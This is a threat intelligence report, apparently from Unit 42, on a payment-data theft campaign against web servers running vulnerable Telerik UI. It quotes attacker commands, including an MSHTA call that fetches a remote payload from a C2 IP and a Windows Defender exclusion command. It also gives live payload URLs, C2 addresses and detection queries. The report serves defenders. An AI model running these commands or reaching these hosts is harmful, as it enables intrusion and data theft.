@@ -1,0 +1,147 @@
+In late May 2024, Unit 42 researchers observed an adversary compromising multiple web servers to gain access to the environment of a multinational organization headquartered in North America. Based on overlaps in adversary infrastructure and tools, as well as tactics, techniques and procedures (TTPs), it’s possible to attribute the activity identified to the same threat actor behind the Silent Skimmer campaign.
+In September 2023, an online payment scraping campaign was uncovered and dubbed Silent Skimmer. Since then, there has been little to no news of Silent Skimmer – until now.
+According to our research, the financially motivated threat actor behind the Silent Skimmer campaign is targeting organizations that host or create payment infrastructure and gateways. Unit 42 tracks the activity identified in this article as CL-CRI-0941.
+Palo Alto Networks customers are better protected from these threats through Cortex XDR and XSIAM, as well as Cloud-Delivered Security Services including Advanced URL Filtering, Advanced DNS Security, Advanced Threat Prevention and Advanced WildFire. Cortex Xpanse is able to identify internet-facing instances of Telerik UI. Organizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others.
+| Related Unit 42 Topics | Remote Code Execution (RCE) |
+In May 2024, Unit 42 researchers investigated an incident where attackers compromised multiple web servers to gain access to their environment and dump payment information. The threat actor gained an initial foothold on the servers by exploiting a couple of one-day Telerik user interface (UI) vulnerabilities.
+Telerik UI is a popular framework for developing the user interface of ASP.NET web applications. The threat actor attempted to exploit two Telerik UI vulnerabilities to gain initial access to the environment:
+- CVE-2017-11317 — Unrestricted file upload via weak encryption
+- CVE-2019-18935 — Remote code execution via insecure deserialization
+Adversaries commonly exploit both of these vulnerabilities. They are a part of CISA’s Known Exploited Vulnerabilities Catalog.
+The vulnerabilities allow for remote code execution on servers running older, vulnerable versions of Telerik UI. We recommend upgrading to the latest available version.
+Following the vulnerabilities' exploitation, the attacker executed multiple reconnaissance commands and gained persistence. The following commands were among those executed:
+- set
+- whoami
+- quser
+- net user
+- dir
+- tasklist /svc
+- ipconfig
+- netstat -ano | findstr \"443\"
+- net localgroup administrators
+- dir c:\users\public
+- "C:\Windows\system32\ARP.EXE" -a
+- "C:\Windows\system32\systeminfo.exe"
+- "C:\Windows\system32\reg.exe" query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
+- cmd /c hostname
+The threat actor leveraged several techniques to achieve a foothold and execution onto the servers and environment.
+The attacker uploaded multiple web shells, mainly to the following directories:
+- C:\Users\Public\Music\
+- C:\WebRoot\Health Checks\Default\
+- C:\WebRoot\Web Applications\*\*\Images\Common\
+- C:\WebRoot\IIS\Web Applications\*\*\Images\Common\
+- C:\WebRoot\IIS\Web Applications\Production\*\*\Images\Common\
+The attacker also dropped and executed multiple reverse shells, as we describe later in the Reverse Shells section. These reverse shells were responsible for the rest of the executions we describe in this article.
+We also observed that the threat actor used tunneling and reverse proxy tools such as Fuso and FRP. These allowed the attacker to expose the exploited servers located behind a network address translation (NAT) or firewall to the internet.
+We observed the following reverse proxy executions:
+We observed the attacker using GodPotato for privilege escalation. GodPotato executed using a Base64-encoded PowerShell command that translated to the command shown in Figure 1 below.
+The attacker retrieved other GodPotato payloads from http://48[.]218.138.60/a.txt and http://48[.]218.138[.]60/m.txt. They used these to execute powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath D:\ to add D:\ to the Windows Defender exclusion list to evade detection.
+To bypass the security measures and make the analysis process more difficult, the threat actor used .NET binaries with native C++ code embedded by leveraging mixed mode assemblies. The threat actor used this as a way to include code from one programming language embedded in another, which is an old technique some programming languages natively support.
+In this case, mixed-mode assemblies were used to embed native C++ code within a .NET binary. As a result, some .NET binary analysis tools are unable to analyze the embedded (unmanaged) code. This requires researchers to put in extra effort to identify the malicious payload. In 2022, Mandiant [PDF] used a sample employing this technique in their annual FLARE-On Challenge.
+The threat actor used this feature to create .NET wrapper binaries to execute malicious code. So when analyzing the binaries with .NET analysis tools like dnSpy for instance, there is no code to be executed as shown in Figure 2.
+Although this is not always the case, Figure 3 shows how dnSpy can identify the usage of mixed mode assemblies and warns about the unmanaged code, also showing the native entry point.
+When jumping to the native entry point address, it is possible to identify the native code as shown in Figures 4 and 5.
+By following the execution flow, it is possible to reach the malicious command executed, as identified in Figure 6. The malicious command uses Microsoft HTML Application Host (MSHTA) Living Off the Land Binaries (LOLBin) to download and execute a remote HTA (HTML Application) payload. It then proxies the execution of the malicious code through a legitimate and official binary.
+During the investigation, Unit 42 researchers observed the threat actor leveraging the RingQ loader as part of their arsenal. The RingQ loader comprises two main components. One is a tool that creates an encrypted file containing the binary to be loaded and executed, and the other is the loader itself, which reflectively loads the binary.
+RingQ can also act as a downloader if configured to do so. Figure 7 shows the logic of the loader and the execution branches to load the encrypted file locally or remotely from a URL specified in the binary resources.
+The samples identified in the activity covered in this article use different methods to load the encrypted payload. Figure 8 shows the value set to the Portable Executable (PE) string table resource of the RingQ loader to download the encrypted payload from a remote URL.
+The GitHub repository of the RingQ loader also includes a tool (QVM250) to tweak the resources of the PE file and include resources from original binaries in an attempt to trick and bypass some security measures. In the activity identified, one of the samples was mimicking PuTTY, a common SSH client for MS Windows (Figure 9).
+After the adversary secured web shell access on the server, they wrote a Windows executable to disk with a .txt file extension. Based on strings in the binary, we could determine that it was a Python script compiled to an executable with PyInstaller (Figure 10).
+Using a tool like PyInstaller Extractor, we could reverse that process and extract the compiled Python bytecode. The bytecode is readable but harder to understand. By using a tool like uncompyle6, we reverted the Python bytecode to its original Python form.
+The nearly 8 MB original executable boils down to a simple Python script, shown below in Figure 11. The rest of the files were artifacts of PyInstaller that allow for proper packaging and execution. The script itself is simple and uses hard-coded credentials to connect to a database in the victim’s organization and dump payment information to a .csv file.
+Once the threat actor gained a foothold on the servers by exploiting the Telerik vulnerabilities, they attempted to achieve persistence by dropping multiple web shells as well as multiple PowerShell reverse shells.
+During our investigation, we observed that the threat actor installed reverse shells by executing multiple MSHTA commands that retrieved an .hta script from a hard-coded IP address, such as the following:
+- mshta http://172[.]86.96.245/129-80.hta (the .hta file script shown in Figure 12)
+We observed these executions with multiple different IP addresses and file names. The IP address in the URL was also used as the command and control (C2) IP address for the reverse shell. The filename represented the port in most cases, which is shown in the first two lines in Figure 12. The .hta file shown in Figure 13 is a VBScript that executes a Base64-encoded PowerShell command that decodes to a PowerShell script.
+The reverse shells were also installed by downloading a .ps1 script, which is the reverse shell, using PowerShell's Invoke-WebRequest utility and executing it (Figure 14).
+One of the Cobalt Strike C2 IP addresses identified in this activity matches an IP address mentioned in a Sophos X-Ops report, where a similar infection chain resulted in an Ambitious Scorpius (BlackCat) ransomware attack. Since Ambitious Scorpius stopped operations after performing an exit scam, this overlap may belong to an affiliate or a cybercrime cluster used across both attacks.
+The BlackBerry Research and Intelligence Team first wrote about the Silent Skimmer campaign back in September 2023. LevelBlue Labs later published their own findings. Since then, we haven't heard much about the campaign.
+A significant number of the TTPs we observed in our investigation align with the ones described in BlackBerry's blog starting from the initial access vector, which is the exploitation of publicly facing web servers. Specifically, both campaigns involved the exploitation of Telerik UI vulnerabilities that are over 5 years old.
+Following initial access, there were mostly identical techniques of installing reverse shells by executing mshta.exe, which downloads and executes an .hta script. While in BlackBerry's incident, the .hta file is a VBScript that downloads and executes a .ps1 script using certutil.exe, which is the reverse shell. In the incident Unit 42 was involved in, the .hta file is a VBScript that executes a PowerShell encoded command that decodes to a PowerShell script, which is the final reverse shell.
+In the incident we were involved in, the attackers used reverse proxy tools and web shells to maintain persistence and control over compromised systems. Additionally, they leveraged GodPotato (a privilege escalation tool) and deployed Cobalt Strike for post-exploitation activities. These findings align closely with the tactics detailed in the BlackBerry blog.
+The main difference between the campaigns is the method used to extract the payment and financial data. In the campaign described by BlackBerry, the attackers append malicious code to different payment-related pages that scrape the payment data. In the campaign we observed, the threat actor used a compiled Python script to connect to a database in the victim’s organization and then dumped payment information to a CSV file for exfiltration.
+With all this information, in alignment with the Unit 42 naming convention procedures, we are tracking this threat activity cluster as CL-CRI-0941.
+Conclusion
+The threat actor behind Silent Skimmer has resurfaced after a year, now leveraging a new technique for scraping payment details. Despite this update, the group's TTPs remain largely consistent with previous activity. This persistence underscores the need for organizations to stay vigilant and patch vulnerabilities promptly to defend against this enduring threat.
+- Cortex XDR and XSIAM help protect against the threats described through modules including Behavioral Threat Protection and Local Analysis.
+- Cloud-Delivered Security Services, including:
+- Advanced URL Filtering and Advanced DNS Security identify known domains and URLs associated with CL-CRI-0941 activity as malicious.
+- Advanced Threat Prevention signatures exist for activity described in this article, including the CVEs mentioned.
+Cortex Xpanse is able to identify internet-facing instances of Telerik UI, including versions that are specifically associated with the vulnerabilities above.
+- North America Toll-Free: 866.486.4842 (866.4.UNIT42)
+- EMEA: +31.20.299.3130
+- APAC: +65.6983.8730
+- Japan: +81.50.1790.0200
+XQL Queries
+|
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 |
+// Description: mshta.exe executing a powershell encoded command config case_sensitive = false | dataset = xdr_data | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START | filter actor_process_image_name = "mshta.exe" // Filtering powershell with base64 encoded commands | filter action_process_image_name = "powershell.exe" and action_process_image_command_line ~= "[A-Za-z0-9+\/]{50,}[=]{0,2}" // Decoding the base64 encoded commands | alter decoded_base64 = convert_from_base_64(arrayindex(regextract(action_process_image_command_line, "[A-Za-z0-9+\/]{50,}[=]{0,2}"),0)) | alter decoded_base64 = replex(decoded_base64, "\x00", "") // Trick to remove null bytes in decoded base64 output | fields _time, agent_hostname, agent_ip_addresses, action_process_image_name, action_process_image_command_line, actor_process_command_line, causality_actor_process_command_line, decoded_base64 |
+|
+1 2 3 4 5 6 7 8 9 10 11 |
+// Description: MSHTA command line config case_sensitive = false | dataset = xdr_data | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START | filter action_process_image_name = "mshta.exe" and action_process_image_command_line ~= "http://(?:(?:\d|[01]?\d\d|2[0-4]\d|25[0-5])\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d|\d)/(?:\d{2,3}|\d{1,3}-\d{2,3}|securityhealth|securityhealthsystray|shell|\w+).hta" | fields _time, agent_hostname, agent_ip_addresses, action_process_image_name, action_process_image_command_line, actor_process_command_line, causality_actor_process_command_line |
+|
+1 2 3 4 5 6 7 8 9 10 11 |
+//Description: Looks for IIS processes dropping DLLs with a naming convention used in a public CVE-2019-18935 POC and in the current incident dataset = xdr_data |filter event_type = ENUM.FILE |filter actor_process_image_name = "w3wp.exe" |filter action_file_name ~= "^[0-9]{10}\.[0-9]{5,7}(?:\.dll|sleep\-[0-9]{10}-amd64)" |fields _time, agent_hostname, actor_process_image_name, actor_process_command_line, action_file_path, action_file_sha256 |
+| Value | Type | Description |
+| 55271d94eb3c95bb6a1965d44bade5ecef5ff610e87133f169e602eb94c39d6b | SHA256 | RingQ Loader |
+| 1b325d32bc99db4b16e2cc4d4810c195f3643936d7ff5baee43ddd18cae9b2a6 | SHA256 | RingQ Loader |
+| 85d67f9f6f82de5a8f5f92fcf9a82bbed2ff6f6d91a06a058a40c5a64882149b | SHA256 | RingQ Loader |
+| b44e6fd83b87d50c8aa8cf62de2578a13c22292fcf298b7664ed828804280dbe | SHA256 | RingQ Loader |
+| e3746de8993069f343a7334046a2361318e213e13883513a7c0713a847fd4dc9 | SHA256 | RingQ Loader |
+| 64ae2bf6920311be2521c47678c04299bd24c2caec2df5b340aa212a69760fda | SHA256 | RingQ Loader |
+| 12508b830149c2d84f2c80947e78218128d16a834c8d0695068f3e773ac62ef9 | SHA256 | GodPotato |
+| 0aa0ca465170315d2f02c471d5d96ce5fbd6076f59be83fa5398968e951a5f51 | SHA256 | GodPotato |
+| dc53581d4c9140b0f987eb6686d67db6d777f8c89114b062be35b8f2847aa66f | SHA256 | Usage of mixed mode assemblies |
+| 3579bae222eb8d7a7c3c16598cf9e81aecbbfc1a2ac2168430e48acfb02cfb24 | SHA256 | Usage of mixed mode assemblies |
+| 5d82f31bc37aa18e5c5110968b1a85aa419c6e2840e17074d2519ed9ad5b914c | SHA256 | Usage of mixed mode assemblies |
+| 5ef5c841f74f9331efb5a43cd16d62fd27eb8293888e872a17c7a57795e37d75 | SHA256 | Usage of mixed mode assemblies |
+| 7dadff4d883b32c01bbcb96baf081649dbfadd186b934a7fd3c9754e0ba87ab3 | SHA256 | Usage of mixed mode assemblies |
+| 8ae2b420245ebbd983d42bb2d8ceb92f2e7ef40181d8f1cb347797ee7a61b2a1 | SHA256 | Usage of mixed mode assemblies |
+| c0244fafbd5231730fdd0bfef2a972dd074f52ca46dc377494424269add81d2b | SHA256 | Usage of mixed mode assemblies |
+| c73e3b300ac9eb956a471cefb2282602834b5809c46b7807cfc06f671a5d9f8f | SHA256 | Usage of mixed mode assemblies |
+| f9e5e09788.ipv6.1433.eu.org | Domain | Connectivity checks |
+| http://20.222.194[.]41/SecurityHealthSystray.hta | URL | MSHTA payload |
+| http://20.210.230.146/SecurityHealthSystray.hta | URL | MSHTA payload |
+| http://13.78.113[.]103/One.ps1 | URL | PowerShell payload |
+| http://13.71.153[.]8/logtest.ps1 | URL | PowerShell payload |
+| nigntboxcdn[.]com | FQDN | Exfiltration |
+| 342daa41ba3989d5ecb95c7c19a55c1a00c12b6c2faa2cac052bc910a6edd56f | SHA256 | Web shell |
+| 28f0f37fcdee2ac2c022bb454b30f05458075434fa57662af2de22ba5cfb45c1 | SHA256 | Web shell |
+| 29a81d3125ab1c886266a03902204253708f8d181c547a88ceb447ef59f99f60 | SHA256 | Web shell |
+| 9b29964d0b3d026aa01713dbdf4361439788c05c8eb8723fc7cfb933245dec45 | SHA256 | Web shell |
+| 311935e115d678adbe502c8cc4e5396323f3f015ee186df6dc9f67ae0248104b | SHA256 | Web shell |
+| 06710575d20cacd123f83eb82994879367e07f267e821873bf93f4db6312a97b | SHA256 | Web shell |
+| 20[.]37.116.136 | IP address | C2 |
+| 167[.]88.168.11 | IP address | C2 |
+| 45[.]61.166.209 | IP address | C2 |
+| 172[.]86.123.127 | IP address | C2 |
+| 48[.]218.138.60 | IP address | C2 |
+| 172[.]86.105.129 | IP address | C2 |
+| 172[.]86.96.245 | IP address | C2 |
+| 20[.]188.26.190 | IP address | C2 |
+| 13[.]78.113.103 | IP address | C2 |
+| 13[.]78.94.29 | IP address | C2 |
+| 52[.]253.107.167 | IP address | C2 |
+| 20[.]89.43.151 | IP address | C2 |
+| 20[.]222.194.41 | IP address | C2 |
+| 20[.]222.138.18 | IP address | C2 |
+| 60[.]204.201.75 | IP address | C2 |
+| 5acac9846035863b178ff75fb2a8bdcd53e5d496007d032c3fb20e0dc8306fd9 | SHA256 | Shellcode runner |
+| b1d10328d0cbe3413d1ec15888e5772e323798072fda1285f17b61a96bf0e34e | SHA256 | Unknown |
+| 91a5f92908c561f1d1814d36da613c5b7411bb45554e1b2d19713f1f6d50a10c | SHA256 | Cobalt Strike |
+| 8240d49629a558acc0426dff40c042fa989fb46159bb5971ee3c4211b68a59d0 | SHA256 | Unknown |
+| a2a17e561d50f69e011598fd2e03b0376f6468609a1b2d6be9d458ee5c8b397d | SHA256 | Unknown |
+| b1da7982199597882a2da8c45114f4cf74fed64447fca8c5f58ced24d7085c77 | SHA256 | Reverse shell |
+| 1c9a9732d600d975b5b44ab326d5cc99123a84d5b400a189902ff6d249a24bda | SHA256 | Reverse shell |
+- It’s Silent Skimmer: Online Payment Scraping Campaign Shifts Targets From APAC to NALA – BlackBerry
+- Into the tank with Nitrogen – Sophos News
+- Mixed (Native and Managed) Assemblies – Microsoft Learn
+- Challenge 6: à la mode [PDF] – Mandiant FLARE-On Challenge on mixed mode assemblies
+- Don’t check out! – Credit card skimming activity observed – LevelBlue
+- GitHub - T4y1oR/RingQ: 一款后渗透免杀工具，助力每一位像我这样的脚本小子快速实现免杀，支持bypass AV/EDR 360 火绒 Windows Defender Shellcode Loader – T4y1oR on GitHub
+- BlackCat ransomware shuts down in exit scam, blames the "feds" – Bleeping Computer
+- Playbook Of The Week - Fending Off Living Off the Land Attacks – Palo Alto Networks
+- AI Skills Challenge, Primitive: Mshta.exe – Microsoft Learn
+- System Binary Proxy Execution: Mshta, Sub-technique T1218.005 – MITRE ATT&CK
+- AI Skills Challenge, HTML Applications – Microsoft Learn
+- Reflective Code Loading, Technique T1620 - Enterprise – Techniques, MITRE ATT&CK
